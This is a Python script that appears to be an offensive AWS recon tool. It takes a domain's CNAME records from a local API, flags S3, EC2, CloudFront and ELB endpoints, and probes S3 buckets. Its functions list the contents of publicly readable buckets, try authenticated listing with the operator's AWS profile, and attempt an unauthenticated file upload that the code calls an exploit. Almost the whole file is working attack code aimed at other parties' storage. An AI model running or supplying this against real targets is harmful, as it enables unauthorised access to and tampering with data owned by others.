import requests
import argparse
import re
import xml.etree.ElementTree as ET
import subprocess

# Lists of services identified by their CNAMEs and their respective patterns
s3_list = []
open_s3_buckets = []
ec2_list = []
cloudfront_list = []
elb_list = []

def get_home_dir():
    get_home_dir = subprocess.run(["echo $HOME"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
    return get_home_dir.stdout.replace("\n", "")

def aws_access_key_check():
    home_dir = get_home_dir()
    print(f"[+] Checking for AWS Credentials in {home_dir}/.aws/credentials")
    try:
        cred_check = subprocess.run(["ls", f"{home_dir}/.aws/credentials"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        if cred_check.returncode == 0:
            print("[+] AWS Credentials found!")
            return True
        else:
            print("[-] AWS Credentials not found, add them by running aws configure for maximum effectiveness.")
            print("\n")
            return False
    except Exception as e:
        print(f"[!] Something went wrong!  Exception: {str(e)}")

def service_detection(cnames):
    print("[+] Starting Service Detection")
    print("------------------------------------")
    s3_pattern = r'(?:(?:[a-zA-Z0-9-]+\.)+s3(?:-website-[a-z0-9-]+)?\.amazonaws\.com)'
    ec2_pattern = r'.*(ec2|compute\.amazonaws\.com).*'
    cloudfront_pattern = r'.*(cloudfront\.net).*'
    elb_pattern = r'.*(elb\.amazonaws\.com).*'

    for cname in cnames:
        s3 = re.findall(s3_pattern, cname)
        ec2 = re.findall(ec2_pattern, cname)   
        cloudfront = re.findall(cloudfront_pattern, cname)
        elb = re.findall(elb_pattern, cname)

        if s3:
            s3_list.append(cname)
            print(f"[+] AWS S3 Bucket Found: {cname}")
        elif ec2:
            ec2_list.append(cname)
            print(f"[+] AWS EC2 Instance Found: {cname}")
        elif cloudfront:
            cloudfront_list.append(cname)
            print(f"[+] AWS Cloudfront Distribution Found: {cname}")
            # cloudfront_checks(cname)
        elif elb:
            elb_list.append(cname)
            print(f"[+] AWS ELB Found: {cname}")
            # elb_checks(cname)
    print(f"[-] Service Detection Complete")
    print("\n")

def s3_bucket_public(bucket_list):
    print("[+] Starting S3 Bucket Checks")
    print("------------------------------------")
    for bucket in bucket_list:
        print(f"[-] Checking S3 bucket: {bucket} for public access")
        try:
            response = requests.get(f"http://{bucket}", timeout=5)
            if "ListBucketResult" in response.text:
                print(f"[!] Public access is open! Adding {bucket} to list of open buckets.")
                print("\n")
                open_s3_buckets.append(bucket)
            else:
                print("[!] Public access does not appear to be open.")
                print("\n")
        except requests.exceptions.Timeout:
            print("[-] Request timed out. this may be a private bucket.")  
            print("\n")
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred -- Bucket may be behind Cloudfront")
            print("\n")
    return open_s3_buckets

def s3_bucket_authenticated(bucket_list):
    for bucket in bucket_list:
        print(f"[-] Checking S3 bucket: {bucket} for authenticated access using default aws profile")
        bucket_ls = subprocess.run(["aws", "s3", "ls", f"s3://{bucket}"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        if bucket_ls.returncode == 0:
            print(f"[!] Authenticated access is open! Dumping file names!")
            print(bucket_ls.stdout)
        else:
            print("[!] Authenticated access does not return any files.")
            print("\n")

def s3_bucket_upload_exploit(buckets):
    for bucket in buckets:
        print(f"[-] Attempting to exploit {bucket} by uploading file")
        try:
            response = requests.put(f"http://{bucket}/test.txt", data="test", timeout=5)
            if response.status_code == 200:
                print("[!] Exploit successful! File uploaded to bucket.")
            else:
                print("[-] Upload Exploit unsuccessful.")
        except requests.exceptions.Timeout:
            print("[-] Request timed out.")  
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred -- check {bucket} manually")

def s3_bucket_download_exploit(buckets):
    for bucket in buckets:
        print(f"[+] Listing contents of {bucket}")
        try:
            response = requests.get(f"http://{bucket}", timeout=5)
            if response.status_code == 200:
                root = ET.fromstring(response.content)
                key_elements = root.findall(".//{http://s3.amazonaws.com/doc/2006-03-01/}Contents/{http://s3.amazonaws.com/doc/2006-03-01/}Key")
                file_names = [key.text for key in key_elements]
                for file_name in file_names:
                    print(f"[!] File found: {file_name}")
            else:
                print(f"[-] Unable to view files, check {bucket} manually.")
            print("\n")
        except requests.exceptions.Timeout:
            print("[-] Request timed out.")  
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred -- check {bucket} manually")


def get_fqdn_obj(args):
    r = requests.post(f'http://{args.server}:{args.port}/api/auto', data={'fqdn':args.fqdn})
    return r.json()

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-S','--server', help='IP Address of MongoDB API', required=False, default="127.0.0.1")
    parser.add_argument('-P','--port', help='Port of MongoDB API', required=False, default="8000")
    parser.add_argument('-d','--fqdn', help='Name of the Root/Seed FQDN', required=True)
    return parser.parse_args() 

def main(args):
    thisFqdn = get_fqdn_obj(args)
    if args.fqdn:
        thisFqdn = get_fqdn_obj(args)
    cname_list = []
    for fqdn in thisFqdn["dns"]['cnamerecord']:
        pattern = r"cname_record\s*-->\s*(.*?)\s*\("
        cname = re.findall(pattern, fqdn)
        cname_list.append(cname[0])
    aws_access_key_check()
    service_detection(cname_list)
    s3_bucket_public(s3_list)
    s3_bucket_download_exploit(open_s3_buckets)
    s3_bucket_authenticated(s3_list)
    s3_bucket_upload_exploit(open_s3_buckets)

if __name__ == '__main__':
    args = arg_parse()
    main(args)